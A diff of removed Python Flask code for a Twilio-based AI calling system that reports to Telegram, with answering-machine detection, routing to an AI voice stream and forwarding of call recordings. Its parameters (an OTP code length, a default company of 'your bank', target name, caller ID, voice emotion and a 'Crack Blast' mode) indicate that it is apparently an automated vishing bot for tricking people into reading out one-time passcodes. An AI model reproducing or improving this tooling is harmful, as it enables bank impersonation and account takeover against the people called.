-@app.route("/amd_callback", methods=["POST"])
-@twilio_request_logger("/amd_callback")
-def amd_callback():
-    """
-    Handle async AMD callbacks from Twilio.
-
-    We parse the `AnsweredBy` value, attach it to the call session if available,
-    and send a Telegram notification to the user/chat provided in the callback.
-    """
-    try:
-        # Parse common fields
-        call_sid = request.form.get("CallSid") or request.values.get("CallSid") or request.args.get("CallSid")
-        answered_by = (request.form.get("AnsweredBy") or request.values.get("AnsweredBy") or request.args.get("AnsweredBy") or "").strip()
-        chat_id = request.form.get("chat_id") or request.values.get("chat_id") or request.args.get("chat_id")
-        user_id = request.form.get("user_id") or request.values.get("user_id") or request.args.get("user_id")
-
-        logger.info(f"AMD callback received: CallSid={call_sid} AnsweredBy={answered_by} user_id={user_id} chat_id={chat_id}")
-
-        # Attach the answered_by to the call session if present
-        if call_sid:
-            session = get_call_session(call_sid)
-        if session is None:
-            session = register_call_session(call_sid, chat_id=chat_id)
-        normalized = normalize_answered_by(answered_by)
-        session["answered_by"] = normalized
-        session["raw_answered_by"] = answered_by or session.get("raw_answered_by", "")
-        confidence = evaluate_amd_confidence(session, answered_by=answered_by, speech_result="", reason="twilio_async_amd")
-        decision = get_amd_decision(confidence, fallback=normalized)
-        session["amd_confidence"] = confidence
-        session["amd_decision"] = decision
-        session["amd_secondary_verification_required"] = decision == "unknown"
-        log_amd_report(call_sid, session, answered_by, confidence, "twilio_async_amd")
-        # preserve chat mapping if provided
-        if chat_id and not session.get("chat_id"):
-            try:
-                session["chat_id"] = int(chat_id)
-            except Exception:
-                session["chat_id"] = chat_id
-
-        # Prepare a human-readable notification
-        text = get_answered_by_label(answered_by)
-        if normalized == "machine":
-            text = "📞 A machine or voicemail answered the call. Ending the call gracefully."
-        elif normalized == "voicemail":
-            text = "📞 A machine or voicemail answered the call. Ending the call gracefully."
-        elif normalized == "fax":
-            text = "📞 A fax machine answered the call. Ending the call gracefully."
-        elif normalized == "human":
-            text = "📞 A human answered the call. Continuing with the AI flow."
-
-        # Notify the chat if provided
-        if chat_id:
-            try:
-                send_telegram_status(int(chat_id), text)
-            except Exception:
-                # fallback to current bot send implementation
-                try:
-                    safe_bot_send_message(int(chat_id), text)
-                except Exception:
-                    logger.debug("Failed to notify chat from AMD callback")
-
-        if session is not None and session.get("call_completed") and session.get("awaiting_async_amd"):
-            # Call already ended, but AMD verdict arrived after completion.
-            # Finalize the session now that we know the answer type.
-            if normalized == "unknown" and not session.get("amd_unknown_alerted"):
-                session["amd_unknown_alerted"] = True
-                notify_amd_unknown(call_sid, user_id or session.get("user_id"), chat_id or session.get("chat_id"))
-            session["awaiting_async_amd"] = False
-            cleanup_call_session(call_sid)
-
-        if normalized == "unknown" and session is not None and not session.get("amd_unknown_alerted"):
-            session["amd_unknown_alerted"] = True
-            notify_amd_unknown(call_sid, user_id or session.get("user_id"), chat_id or session.get("chat_id"))
-
-        # Also return the legacy handlers' response if any (call into handlers module)
-        try:
-            # Keep backward compatibility: allow handlers' AMD hook to run if it exists
-            return amd_callback_flask(request)
-        except Exception:
-            return "", 200
-
-    except Exception as e:
-        logger.exception(f"AMD callback handler error: {e}")
-        return "", 500
-
-
-@app.route("/amd_hold", methods=["POST"])
-@twilio_request_logger("/amd_hold")
-def amd_hold():
-    """Route the call based on Twilio AMD verdict directly into the AI-driven call flow."""
-    from twilio.twiml.voice_response import VoiceResponse
-
-    user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
-    chat_id = request.values.get("chat_id") or request.args.get("chat_id")
-    call_sid = request.values.get("CallSid") or request.args.get("CallSid") or request.values.get("call_sid") or request.args.get("call_sid")
-    answered_by = (
-        request.values.get("AnsweredBy")
-        or request.args.get("AnsweredBy")
-        or request.values.get("answered_by")
-        or request.args.get("answered_by")
-        or None
-    )
-
-    # Prefer server-side canonical AMD if available in the shared session store
-    session = get_call_session(call_sid) if call_sid else None
-    if session and session.get("answered_by"):
-        answered_by = session.get("answered_by")
-
-    # If no chat_id in the request, prefer session mapping
-    if not chat_id and session:
-        try:
-            chat_id = session.get("chat_id")
-        except Exception:
-            pass
-
-    resp = VoiceResponse()
-    normalized = normalize_answered_by(answered_by)
-
-    if session is None and call_sid:
-        session = get_call_session(call_sid)
-    if session is not None:
-        existing_confidence = session.get("amd_confidence") or {}
-        if existing_confidence:
-            confidence = existing_confidence
-        else:
-            confidence = evaluate_amd_confidence(session, answered_by=answered_by, speech_result="", reason="amd_hold")
-            session["amd_confidence"] = confidence
-            session["amd_decision"] = get_amd_decision(confidence, fallback=normalized)
-            session["amd_secondary_verification_required"] = session["amd_decision"] == "unknown"
-            log_amd_report(call_sid, session, answered_by, confidence, "amd_hold")
-
-    if normalized == "human" or (session is not None and session.get("amd_decision") == "human"):
-        if chat_id is not None:
-            try:
-                send_telegram_status(int(chat_id), "📞 A human answered the call. Continuing with the AI flow.")
-            except Exception as e:
-                logger.debug(f"Failed to notify chat from amd_hold: {e}")
-        redirect_url = f"/ai_start?user_id={quote_plus(str(user_id))}"
-        if chat_id:
-            redirect_url += f"&chat_id={quote_plus(str(chat_id))}"
-    elif normalized in {"machine", "voicemail", "fax"} or (session is not None and session.get("amd_decision") in {"machine", "voicemail", "fax"}):
-        if chat_id is not None:
-            message = {
-                "machine": "📞 A machine answered the call. Ending the call gracefully.",
-                "voicemail": "📞 A voicemail answered the call. Ending the call gracefully.",
-                "fax": "📞 A fax machine answered the call. Ending the call gracefully.",
-            }.get(normalized, "📞 A machine or voicemail answered the call. Ending the call gracefully.")
-            try:
-                send_telegram_status(int(chat_id), message)
-            except Exception as e:
-                logger.debug(f"Failed to notify chat from amd_hold: {e}")
-        resp.say("Thank you. Goodbye.")
-        resp.hangup()
-        return Response(str(resp), content_type="application/xml")
-    else:
-        if chat_id is not None:
-            try:
-                send_telegram_status(int(chat_id), "📞 Answer type could not be determined. Running a brief secondary verification.")
-            except Exception as e:
-                logger.debug(f"Failed to notify chat from amd_hold: {e}")
-        redirect_url = f"/handle_acknowledgment?user_id={quote_plus(str(user_id))}"
-        if chat_id:
-            redirect_url += f"&chat_id={quote_plus(str(chat_id))}"
-
-    for key in [
-        "name",
-        "company",
-        "from_name",
-        "voice_id",
-        "voice_name",
-        "emotion",
-        "language",
-        "delivery",
-        "code_length",
-        "call_type",
-        "mode_label",
-        "caller_id",
-        "custom_script",
-        "verification_type",
-        "verification_purpose",
-        "business_type",
-        "region",
-    ]:
-        value = request.values.get(key) or request.args.get(key)
-        if value is not None and value != "":
-            redirect_url += f"&{quote_plus(str(key))}={quote_plus(str(value))}"
-
-    resp.pause(length=1)
-    resp.redirect(redirect_url, method="POST")
-    return Response(str(resp), content_type="application/xml")
-
-
-@app.route("/twilio/recording", methods=["POST"])
-@twilio_request_logger("/twilio/recording")
-def twilio_recording_callback():
-    return recording_callback()
-
-
-@app.route("/recording_callback", methods=["POST"])
-@twilio_request_logger("/recording_callback")
-def recording_callback():
-    """
-    Handle Twilio recording status callbacks. Downloads the recording and forwards
-    it to the Telegram chat specified in the original call creation (`user_id`/`chat_id`).
-    """
-    log_twilio_request_debug("/recording_callback")
-    # Validate request
-    is_valid = validate_twilio_request()
-    if not is_valid:
-        logger.error("[ERROR] Recording callback: Twilio validation FAILED")
-        return Response("OK", status=200)
-
-    try:
-        recording_sid = request.form.get("RecordingSid") or request.values.get("RecordingSid")
-        recording_url = request.form.get("RecordingUrl") or request.values.get("RecordingUrl")
-        call_sid = request.form.get("CallSid") or request.values.get("CallSid")
-        user_id = request.args.get("user_id") or request.form.get("user_id") or request.values.get("user_id")
-        chat_id = request.args.get("chat_id") or request.form.get("chat_id") or request.values.get("chat_id")
-
-        logger.info(
-            "Recording callback received: call_sid=%s recording_sid=%s user_id=%s chat_id=%s recording_url=%s",
-            call_sid, recording_sid, user_id, chat_id, recording_url,
-        )
-
-        if not recording_sid or not recording_url or not call_sid:
-            logger.warning("Recording callback missing required fields: %s %s %s", recording_sid, recording_url, call_sid)
-            return Response("OK", status=200)
-
-        from requests.auth import HTTPBasicAuth
-        import requests
-        url = recording_url
-        if url.endswith('.json'):
-            url = url.replace('.json', '.mp3')
-        elif not url.endswith('.mp3') and not url.endswith('.wav'):
-            url = f"{recording_url}.mp3"
-
-        r = requests.get(url, auth=HTTPBasicAuth(ACCOUNT_SID, AUTH_TOKEN), timeout=30)
-        if r.status_code == 200 and r.content and len(r.content) > 128:
-            session = get_call_session(call_sid)
-            saved_user_id = user_id or (session.get("user_id") if session else None)
-            saved_chat_id = chat_id or (session.get("chat_id") if session else None)
-            if saved_user_id:
-                if not save_and_send_recording(call_sid, saved_user_id, saved_chat_id, r.content):
-                    logger.warning(f"Failed to save/send recording for callback CallSid={call_sid}")
-            else:
-                logger.warning(f"Recording callback has no user_id for CallSid={call_sid}")
-        else:
-            logger.warning(f"Failed to download valid recording {recording_sid}: HTTP {r.status_code}, bytes={len(r.content) if r.content is not None else 'None'}")
-
-    except Exception as e:
-        logger.exception("Error in /recording_callback: %s", e)
-
-    return Response("OK", status=200)
-
-# ======================================================================
-# AI-POWERED CALL FLOW ENDPOINT
-# ======================================================================
-
-@app.route("/ai_start", methods=["POST"])
-def ai_start():
-    """
-    Entry point for AI-driven calls using Media Streams.
-    Supports all call types: Normal, Manual, Custom, AI Emotion, Crack Blast.
-    Receives Twilio call and starts Media Stream WebSocket.
-    
-    Query parameters:
-    - user_id: Bot user ID
-    - chat_id: Telegram chat ID
-    - name: Target name
-    - company: Company name
-    - voice_id: ElevenLabs voice ID
-    - emotion: Voice emotion (neutral, angry, calm, urgent)
-    - custom_script: Custom script (for Manual/Custom call, overrides default system prompt)
-    - code_length: OTP code length (optional, defaults to 6)
-    - call_type: Call type (normal, manual, custom, emotion, crack_blast) - auto-detected if not provided
-    - mode_label: Display label for UI
-    """
-    from urllib.parse import quote_plus
-    
-    user_id = request.values.get("user_id") or request.args.get("user_id")
-    chat_id = request.values.get("chat_id") or request.args.get("chat_id")
-    name = request.values.get("name") or request.args.get("name")
-    company = request.values.get("company") or request.args.get("company")
-    voice_id = request.values.get("voice_id") or request.args.get("voice_id")
-    voice_name = request.values.get("voice_name") or request.args.get("voice_name")
-    emotion = request.values.get("emotion") or request.args.get("emotion", "neutral")
-    custom_script = request.values.get("custom_script") or request.args.get("custom_script")
-    language = request.values.get("language") or request.args.get("language")
-    delivery = request.values.get("delivery") or request.args.get("delivery")
-    verification_type = request.values.get("verification_type") or request.args.get("verification_type")
-    verification_purpose = request.values.get("verification_purpose") or request.args.get("verification_purpose")
-    business_type = request.values.get("business_type") or request.args.get("business_type")
-    region = request.values.get("region") or request.args.get("region")
-    code_length = request.values.get("code_length") or request.args.get("code_length", "6")
-    call_type = request.values.get("call_type") or request.args.get("call_type", "normal")
-    mode_label = request.values.get("mode_label") or request.args.get("mode_label", "AI Call")
-    caller_id = request.values.get("caller_id") or request.args.get("caller_id")
-    call_sid = request.values.get("CallSid", "")
-    
-    logger.info(f"[AI_START] Call {call_sid[:8] if call_sid else 'unknown'} type={call_type} user={user_id}")
-    
-    if not user_id:
-        return Response("Missing user_id", status=400)
-    
-    if not USE_AI_FLOW:
-        logger.error(f"[AI_START] CRITICAL: /ai_start called but USE_AI_FLOW=false")
-        return Response("AI flow is disabled in config", status=400)
-    
-    session = None
-    try:
-        from ai.session import get_session
-        if not call_sid:
-            logger.error(f"[AI_START] CRITICAL: Missing CallSid from Twilio")
-            return Response("Missing CallSid", status=400)
-        
-        session = get_session(call_sid)
-        
-        # Initialize session with all call type data
-        session.name = name or read_user_file(user_id, "Name.txt", "Customer")
-
-        decision = session.get("amd_decision") or session.get("answered_by")
-        if decision and decision != "human":
-            logger.info(f"[AI_START] AMD decision blocked launch for {call_sid}: {decision}")
-            return Response("AMD verification did not confirm a human", status=200)
-        session.company = company or read_user_file(user_id, "Company Name.txt", "your bank")
-        session.voice_id = voice_id or read_user_file(user_id, "Voice.txt", DEFAULT_VOICE_ID)
-        session.voice_name = voice_name or read_user_file(user_id, "VoiceName.txt", "")
-        session.emotion = emotion.lower() if emotion else "neutral"
-        session.language = language or read_user_file(user_id, "Language.txt", "")
-        session.delivery = delivery or read_user_file(user_id, "Delivery.txt", "")
-        session.verification_type = verification_type
-        session.verification_purpose = verification_purpose
-        session.business_type = business_type
-        session.region = region
-        try:
-            session.chat_id = int(chat_id) if chat_id else None
-        except (ValueError, TypeError):
-            session.chat_id = None
-        session.custom_script = custom_script  # Treated as additional instructions, not a fixed script
-        session.call_type = call_type
-        session.mode_label = mode_label
-        session.caller_id = caller_id
-        
-        try:
-            session.code_length = int(code_length)
-        except (ValueError, TypeError):
-            session.code_length = 6
-        
-        logger.warning(
-            f"[AI_START] ✅ Session initialized: "
-            f"CallSid={call_sid[:8]}, type={call_type}, emotion={session.emotion}, "
-            f"code_len={session.code_length}, voice={session.voice_id}"
-        )
-    except ImportError as e:
-        logger.error(f"[AI_START] CRITICAL: Cannot import ai.session - {e}")
-        return Response("AI modules not installed", status=500)
-    except Exception as e:
-        logger.error(f"[AI_START] CRITICAL: Session init error - {e}", exc_info=True)
-        return Response(f"Session init error: {e}", status=500)
-    
-    if not session:
-        logger.error(f"[AI_START] CRITICAL: Session is None after initialization")
-        return Response("Session initialization failed", status=500)
-    
-    # Register call in session tracking with proper mode_label
-    register_call_session(
-        call_sid,
-        user_id,
-        chat_id=int(chat_id) if chat_id else None,
-        endpoint="/ai_start",
-        mode_label=mode_label
-    )
-    
-    # Build TwiML: start AI call with Twilio Media Stream
-    return _build_voice_twiml(call_sid, user_id, session.chat_id, None, request)
-
-
-def _build_voice_twiml(call_sid: str, user_id: str, chat_id: Optional[int], answered_by: Optional[str], request_obj=None) -> Response:
-    """Return TwiML for the Twilio voice webhook path, logging each milestone once."""
-
-    session = get_call_session(call_sid) if call_sid else None
-    if session is None and call_sid:
-        session = register_call_session(call_sid, user_id=user_id, chat_id=chat_id, endpoint="/voice", mode_label="Normal Call")
-
-    logger.info(
-        "[VOICE] Call %s for user %s answered_by=%s",
-        call_sid[:8] if call_sid else "unknown",
-        user_id,
-        answered_by or "unknown",
-    )
-
-    if session is not None and getattr(session, "mark_milestone", None):
-        if session.mark_milestone("VOICE_WEBHOOK_ENTERED"):
-            logger.info("[CALL_MILESTONE] VOICE_WEBHOOK_ENTERED call_sid=%s", call_sid or "unknown")
-
-    resp = VoiceResponse()
-    normalized = normalize_answered_by(answered_by)
-    if normalized not in ("human", "unknown"):
-        if session is not None and getattr(session, "mark_milestone", None):
-            if session.mark_milestone("TWIML_GENERATED"):
-                logger.info("[CALL_MILESTONE] TWIML_GENERATED call_sid=%s reason=machine", call_sid or "unknown")
-        if session is not None and getattr(session, "mark_milestone", None):
-            if session.mark_milestone("TWIML_SENT"):
-                logger.info("[CALL_MILESTONE] TWIML_SENT call_sid=%s", call_sid or "unknown")
-        resp.say("Thank you. Goodbye.")
-        resp.hangup()
-        return Response(str(resp), content_type="application/xml")
-
-    try:
-        stream_url = build_media_stream_url()
-    except ValueError:
-        stream_url = f"{build_public_base_url()}/twilio/media" if build_public_base_url() else "wss://example.invalid/twilio/media"
-        logger.warning("[MEDIA_STREAM_FALLBACK] Using fallback media stream URL: %s", stream_url)
-
-    logger.warning("[MEDIA_STREAM_URL] call_sid=%s stream_url=%s", call_sid or "unknown", stream_url)
-    print("=" * 60, flush=True)
-    print(f"  MEDIA STREAM URL used in <Connect><Stream> = {stream_url}", flush=True)
-    print("=" * 60, flush=True)
-    connect = Connect()
-    connect.stream(url=stream_url)
-    resp.append(connect)
-
-    twiml_xml = str(resp)
-    logger.warning("[TWIML_RESPONSE] call_sid=%s twiml=%s", call_sid or "unknown", twiml_xml.replace("\n", " "))
-    print("=" * 60, flush=True)
-    print("TwiML RETURNED TO TWILIO", flush=True)
-    print(twiml_xml, flush=True)
-    print("=" * 60, flush=True)
-
-    if session is not None and getattr(session, "mark_milestone", None):
-        if session.mark_milestone("TWIML_GENERATED"):
-            logger.info("[CALL_MILESTONE] TWIML_GENERATED call_sid=%s endpoint=media_stream", call_sid or "unknown")
-    if session is not None and getattr(session, "mark_milestone", None):
-        if session.mark_milestone("TWIML_SENT"):
-            logger.info("[CALL_MILESTONE] TWIML_SENT call_sid=%s", call_sid or "unknown")
-    return Response(twiml_xml, content_type="application/xml")
-
-
-@app.route("/voice", methods=["POST"])
-@app.route("/twilio/voice", methods=["POST"])
-@twilio_request_logger("/voice")
-def voice():
-    call_sid = request.values.get("CallSid", "")
-    user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
-    chat_id_str = request.values.get("chat_id") or request.args.get("chat_id")
-    answered_by = request.values.get("AnsweredBy") or request.values.get("answered_by")
-    chat_id = int(chat_id_str) if chat_id_str and chat_id_str not in ("None", "unknown") else None
-    return _build_voice_twiml(call_sid, user_id, chat_id, answered_by, request)
-
-
-def _text_contains_term(text: str, signals: list[str]) -> bool:
-    if not text or not signals:
-        return False
-    normalized = text.strip().lower()
-    for signal in signals:
-        if not signal:
-            continue
-        pattern = fr"\b{re.escape(signal)}\b"
-        if re.search(pattern, normalized):
-            return True
-    return False
-
-
-def normalize_answered_by(answered_by: str) -> str:
-    if not answered_by:
-        return "unknown"
-    text = str(answered_by).strip().lower()
-    if text in ("", "unknown", "undetermined", "unrecognized"):
-        return "unknown"
-    if "human" in text:
-        return "human"
-    if "fax" in text:
-        return "fax"
-    if "voicemail" in text:
-        return "voicemail"
-    if any(token in text for token in [
-        "answering machine",
-        "machine",
-        "automated",
-        "robot",
-        "recorded",
-        "recording",
-        "mailbox",
-    ]):
-        return "machine"
-    return text
-
-
-def get_answered_by_label(answered_by: str) -> str:
-    normalized = normalize_answered_by(answered_by)
-    if normalized == "human":
-        return "A human answered the call."
-    if normalized == "fax":
-        return "A fax machine answered the call."
-    if normalized == "voicemail":
-        return "A machine or voicemail answered the call."
-    if normalized == "machine":
-        return "A machine answered the call."
-    if normalized == "unknown":
-        return "The answer type could not be determined."
-    return f"Answer result: {answered_by or 'unknown'}."
-
-
-def _is_positive_acknowledgment(text: str) -> bool:
-    positive_signals = [
-        "yes",
-        "yeah",
-        "yep",
-        "sure",
-        "hello",
-        "hi",
-        "can you hear me",
-        "i can hear you",
-        "i'm here",
-        "i am here",
-    ]
-    return _text_contains_term(text, positive_signals)
-
-
-def _looks_like_machine_or_voicemail(text: str) -> bool:
-    machine_signals = [
-        "voicemail",
-        "recorded",
-        "recording",
-        "answering machine",
-        "automated",
-        "robot",
-        "machine",
-        "mailbox",
-        "leave a message",
-        "press 1",
-        "press one",
-    ]
-    return _text_contains_term(text, machine_signals)
-
-
-def evaluate_amd_confidence(session: Optional[dict], answered_by: Optional[str] = None, speech_result: str = "", silence_duration: Optional[float] = None, beep_detected: bool = False, reason: str = "amd") -> Dict[str, float]:
-    """Create an internal confidence model for human vs machine vs voicemail vs unknown."""
-    scores = {
-        "human_confidence": 0.0,
-        "machine_confidence": 0.0,
-        "voicemail_confidence": 0.0,
-        "unknown_confidence": 0.0,
-    }
-
-    normalized = normalize_answered_by(answered_by)
-    if normalized == "human":
-        scores["human_confidence"] += 0.75
-        scores["unknown_confidence"] += 0.05
-    elif normalized == "machine":
-        scores["machine_confidence"] += 0.75
-        scores["unknown_confidence"] += 0.05
-    elif normalized == "voicemail":
-        scores["voicemail_confidence"] += 0.75
-        scores["unknown_confidence"] += 0.05
-    elif normalized == "fax":
-        scores["machine_confidence"] += 0.6
-        scores["voicemail_confidence"] += 0.1
-        scores["unknown_confidence"] += 0.08
-    else:
-        scores["unknown_confidence"] += 0.15
-
-    speech_text = (speech_result or "").strip()
-    if speech_text:
-        positive_signals = [
-            "hello",
-            "hi",
-            "yes",
-            "yeah",
-            "yep",
-            "can you hear me",
-            "i can hear you",
-            "i am here",
-            "i'm here",
-            "this is",
-            "speaking",
-        ]
-        machine_signals = [
-            "voicemail",
-            "recorded",
-            "recording",
-            "answering machine",
-            "automated",
-            "robot",
-            "machine",
-            "mailbox",
-            "leave a message",
-            "press 1",
-            "press one",
-        ]
-        if _text_contains_term(speech_text, positive_signals):
-            scores["human_confidence"] += 0.2
-            scores["unknown_confidence"] -= 0.05
-        if _text_contains_term(speech_text, machine_signals):
-            scores["machine_confidence"] += 0.18
-            scores["voicemail_confidence"] += 0.12
-            scores["unknown_confidence"] -= 0.05
-        if "hello" in speech_text.lower() and len(speech_text.split()) <= 4:
-            scores["human_confidence"] += 0.05
-
-    if silence_duration is not None:
-        if silence_duration <= 0.8:
-            scores["human_confidence"] += 0.08
-            scores["unknown_confidence"] -= 0.03
-        elif silence_duration >= 2.5:
-            scores["unknown_confidence"] += 0.06
-
-    if beep_detected:
-        scores["machine_confidence"] += 0.1
-        scores["voicemail_confidence"] += 0.05
-
-    if session is not None:
-        session["amd_confidence"] = scores
-        session["amd_last_reason"] = reason
-
-    total = sum(scores.values())
-    if total <= 0:
-        return {
-            "human_confidence": 0.25,
-            "machine_confidence": 0.25,
-            "voicemail_confidence": 0.25,
-            "unknown_confidence": 0.25,
-        }
-
-    return {
-        "human_confidence": round(scores["human_confidence"] / total, 4),
-        "machine_confidence": round(scores["machine_confidence"] / total, 4),
-        "voicemail_confidence": round(scores["voicemail_confidence"] / total, 4),
-        "unknown_confidence": round(scores["unknown_confidence"] / total, 4),
-    }
-
-
-def get_amd_decision(confidence: Dict[str, float], fallback: Optional[str] = None) -> str:
-    if not confidence:
-        return fallback or "unknown"
-    human = confidence.get("human_confidence", 0.0)
-    machine = confidence.get("machine_confidence", 0.0)
-    voicemail = confidence.get("voicemail_confidence", 0.0)
-    unknown = confidence.get("unknown_confidence", 0.0)
-    if human >= 0.65 and human >= max(machine, voicemail, unknown):
-        return "human"
-    if machine >= 0.55 and machine >= max(human, voicemail, unknown):
-        return "machine"
-    if voicemail >= 0.55 and voicemail >= max(human, machine, unknown):
-        return "voicemail"
-    if unknown >= 0.55 and unknown >= max(human, machine, voicemail):
-        return "unknown"
-    if human >= 0.45 and human >= max(machine, voicemail) and unknown <= 0.35:
-        return "human"
-    return fallback or "unknown"
-
-
-def log_amd_report(call_sid: Optional[str], session: Optional[dict], answered_by: Optional[str], confidence: Dict[str, float], reason: str, speech_result: str = "") -> None:
-    if not call_sid:
-        return
-    human = confidence.get("human_confidence", 0.0) * 100
-    machine = confidence.get("machine_confidence", 0.0) * 100
-    voicemail = confidence.get("voicemail_confidence", 0.0) * 100
-    unknown = confidence.get("unknown_confidence", 0.0) * 100
-    decision = get_amd_decision(confidence, fallback="unknown")
-    logger.info(
-        "[AMD REPORT] CallSid=%s Twilio=%s Human=%.0f%% Machine=%.0f%% Voicemail=%.0f%% Unknown=%.0f%% Decision=%s Reason=%s Speech=%s",
-        call_sid[:8] if call_sid else "unknown",
-        (answered_by or "unknown"),
-        human,
-        machine,
-        voicemail,
-        unknown,
-        decision,
-        reason,
-        (speech_result or "")[:120],
-    )
-    if session is not None:
-        session["amd_decision"] = decision
-        session["amd_reason"] = reason
-        session["amd_secondary_verification_required"] = decision == "unknown"
-
-
-def _build_ai_flow_redirect_url(
-    user_id: str,
-    chat_id: Optional[int] = None,
-    voice_id: Optional[str] = None,
-    name: Optional[str] = None,
-    company: Optional[str] = None,
-    from_name: Optional[str] = None,
-    emotion: Optional[str] = None,
-    language: Optional[str] = None,
-    delivery: Optional[str] = None,
-    code_length: Optional[str] = None,
-    call_type: str = "normal",
-    mode_label: str = "AI Flow",
-) -> str:
-    redirect_url = (
-        f"/ai_start?user_id={quote_plus(str(user_id))}"
-        f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
-        f"&call_type={quote_plus(str(call_type))}"
-        f"&mode_label={quote_plus(str(mode_label))}"
-    )
-    if voice_id:
-        redirect_url += f"&voice_id={quote_plus(str(voice_id))}"
-    if name:
-        redirect_url += f"&name={quote_plus(str(name))}"
-    if company:
-        redirect_url += f"&company={quote_plus(str(company))}"
-    if from_name:
-        redirect_url += f"&from_name={quote_plus(str(from_name))}"
-    if emotion:
-        redirect_url += f"&emotion={quote_plus(str(emotion))}"
-    if language:
-        redirect_url += f"&language={quote_plus(str(language))}"
-    if delivery:
-        redirect_url += f"&delivery={quote_plus(str(delivery))}"
-    if code_length not in (None, "", "None", "unknown"):
-        redirect_url += f"&code_length={quote_plus(str(code_length))}"
-    return redirect_url
-
-
-@app.route("/handle_greeting", methods=["POST"])
-@twilio_request_logger("/handle_greeting")
-def handle_greeting():
-    from twilio.twiml.voice_response import VoiceResponse, Gather
-
-    user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
-    chat_id_str = request.values.get("chat_id") or request.args.get("chat_id")
-    call_sid = request.values.get("CallSid", "")
-    chat_id = int(chat_id_str) if chat_id_str and chat_id_str not in ("None", "unknown") else None
-    speech_result = (request.values.get("SpeechResult") or request.values.get("speech_result") or "").strip()
-    digits = (request.values.get("Digits") or "").strip()
-    emotion = request.values.get("emotion") or request.args.get("emotion") or "neutral"
-    delivery = request.values.get("delivery") or request.args.get("delivery") or get_call_delivery(call_sid, user_id)
-    language = get_call_language(call_sid, user_id)
-    voice_id, voice_name = get_request_voice_info(call_sid, user_id)
-    name = get_call_name(call_sid, user_id)
-    company = get_call_company(call_sid, user_id)
-    from_name = get_call_from_name(call_sid, user_id)
-
-    if from_name:
-        caller_identity = f"{from_name} from {company}"
-    else:
-        caller_identity = company
-
-    session = get_call_session(call_sid)
-    if call_sid and session is None:
-        register_call_session(call_sid, user_id, chat_id=chat_id, endpoint="/handle_greeting", mode_label="Normal Call")
-        session = get_call_session(call_sid)
-    if session is None:
-        session = {}
-
-    # Prefer session chat_id if request did not provide one
-    if chat_id is None and session.get("chat_id"):
-        try:
-            chat_id = int(session.get("chat_id"))
-        except Exception:
-            chat_id = session.get("chat_id")
-
-    session["greeting_attempts"] = session.get("greeting_attempts", 0)
-
-    # If async AMD already determined answer type, prefer that canonical source
-    answered_by = session.get("answered_by") if session else None
-    if answered_by:
-        ab = str(answered_by).lower()
-        if ab == "human":
-            # Notify and route to AI flow
-            if chat_id is not None:
-                send_telegram_status(chat_id, "📞 A human answered the call. Continuing with the AI flow.")
-            if digits == "1":
-                try:
-                    safe_bot_send_message(int(chat_id), "Human Pressed 1")
-                except Exception as e:
-                    logger.debug(f"Failed to send 'Human Pressed 1' notification: {e}")
-
-            redirect_url = _build_ai_flow_redirect_url(
-                user_id=user_id,
-                chat_id=chat_id,
-                voice_id=voice_id,
-                name=name,
-                company=company,
-                from_name=from_name,
-                emotion=emotion,
-                language=language,
-                delivery=delivery,
-                code_length=get_call_code_length(call_sid, user_id),
-            )
-            resp = VoiceResponse()
-            resp.redirect(redirect_url, method="POST")
-            return Response(str(resp), content_type="application/xml")
-        elif ab not in ("unknown", ""):
-            if chat_id is not None:
-                send_telegram_status(chat_id, "📞 A machine or voicemail answered the call. Ending the call gracefully.")
-            resp = VoiceResponse()
-            resp.say("Thank you. Goodbye.")
-            resp.hangup()
-            return Response(str(resp), content_type="application/xml")
-
-    # Fallback: use speech result heuristics if AMD not yet present
-    if digits == "1" or _is_positive_acknowledgment(speech_result):
-        confidence = evaluate_amd_confidence(session, answered_by="unknown", speech_result=speech_result, reason="handle_greeting_positive")
-        decision = get_amd_decision(confidence, fallback="human")
-        if decision == "human":
-            if chat_id is not None:
-                send_telegram_status(chat_id, "📞 A human answered the call. Continuing with the AI flow.")
-            session["greeting_attempts"] = 0
-            redirect_url = _build_ai_flow_redirect_url(
-                user_id=user_id,
-                chat_id=chat_id,
-                voice_id=voice_id,
-                name=name,
-                company=company,
-                from_name=from_name,
-                emotion=emotion,
-                language=language,
-                delivery=delivery,
-                code_length=get_call_code_length(call_sid, user_id),
-            )
-            resp = VoiceResponse()
-            resp.redirect(redirect_url, method="POST")
-            return Response(str(resp), content_type="application/xml")
-        if decision in {"machine", "voicemail", "fax"}:
-            if chat_id is not None:
-                send_telegram_status(chat_id, "📞 A machine or voicemail answered the call. Ending the call gracefully.")
-            resp = VoiceResponse()
-            resp.say("Thank you. Goodbye.")
-            resp.hangup()
-            return Response(str(resp), content_type="application/xml")
-
-    if digits == "1" or _is_positive_acknowledgment(speech_result):
-        if chat_id is not None:
-            send_telegram_status(chat_id, "📞 A human answered the call. Continuing with the AI flow.")
-        session["greeting_attempts"] = 0
-        redirect_url = _build_ai_flow_redirect_url(
-            user_id=user_id,
-            chat_id=chat_id,
-            voice_id=voice_id,
-            name=name,
-            company=company,
-            from_name=from_name,
-            emotion=emotion,
-            language=language,
-            delivery=delivery,
-            code_length=get_call_code_length(call_sid, user_id),
-        )
-        resp = VoiceResponse()
-        resp.redirect(redirect_url, method="POST")
-        return Response(str(resp), content_type="application/xml")
-
-    session["greeting_attempts"] += 1
-    resp = VoiceResponse()
-    resp.redirect(
-        _build_ai_flow_redirect_url(
-            user_id=user_id,
-            chat_id=chat_id,
-            voice_id=voice_id,
-            name=name,
-            company=company,
-            from_name=from_name,
-            emotion=emotion,
-            language=language,
-            delivery=delivery,
-        ),
-        method="POST",
-    )
-    return Response(str(resp), content_type="application/xml")
-
-
-@app.route("/handle_acknowledgment", methods=["POST"])
-@twilio_request_logger("/handle_acknowledgment")
-def handle_acknowledgment():
-    from twilio.twiml.voice_response import VoiceResponse, Gather
-
-    user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
-    chat_id_str = request.values.get("chat_id") or request.args.get("chat_id")
-    call_sid = request.values.get("CallSid", "")
-    chat_id = int(chat_id_str) if chat_id_str and chat_id_str not in ("None", "unknown") else None
-    speech_result = (request.values.get("SpeechResult") or request.values.get("speech_result") or "").strip()
-    digits = (request.values.get("Digits") or "").strip()
-    emotion = request.values.get("emotion") or request.args.get("emotion") or "neutral"
-    delivery = request.values.get("delivery") or request.args.get("delivery") or get_call_delivery(call_sid, user_id)
-    language = get_call_language(call_sid, user_id)
